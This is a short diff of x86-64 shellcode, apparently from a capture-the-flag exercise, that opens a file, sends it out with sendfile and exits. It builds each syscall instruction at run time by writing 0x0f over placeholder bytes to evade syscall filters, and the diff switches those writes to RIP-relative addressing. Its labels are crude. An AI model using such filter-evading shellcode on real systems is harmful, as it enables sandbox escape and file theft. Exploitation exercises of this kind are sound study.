@@ -20,7 +20,7 @@ open:
 	xor rdx, rdx
 	// 0f 05
 	//inc word ptr [cocks]
-	movb [cocks], 0x0f
+	movb [rip+cocks], 0x0f
 	//syscall
 	nop
 cocks:	.byte 0x05, 0x05
@@ -39,7 +39,7 @@ sendfile:
 
 	mov	al, 40
 
-	movb [dicks], 0x0f
+	movb [rip+dicks], 0x0f
 	nop
 dicks: .byte 0x05, 0x05
 exit:	//exit
@@ -47,7 +47,7 @@ exit:	//exit
 	xor	rdi, rdi
 
 
-	movb [pricks], 0x0f
+	movb [rip+pricks], 0x0f
 	nop
 pricks: .byte 0x05, 0x05
 
